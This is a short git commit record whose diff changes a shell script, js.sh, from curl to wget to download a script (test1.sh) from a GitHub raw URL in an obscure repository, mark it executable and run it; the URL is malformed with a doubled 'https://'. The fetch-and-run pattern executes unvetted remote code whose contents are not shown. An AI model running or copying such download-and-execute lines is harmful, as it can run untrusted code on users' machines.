e04eb8db08b93783dbc96f45904574a7f4c31556
John Doe <dalex11awoo@protonmail.com>
2021-07-06 12:23:42 +0700

    weget

--- js.sh
+++ js.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 
-curl  https://https://raw.githubusercontent.com/makrker/vdfvd/main/test1.sh 
+wget  https://https://raw.githubusercontent.com/makrker/vdfvd/main/test1.sh 
  
  chmod +x test1.sh
  ./test1.sh
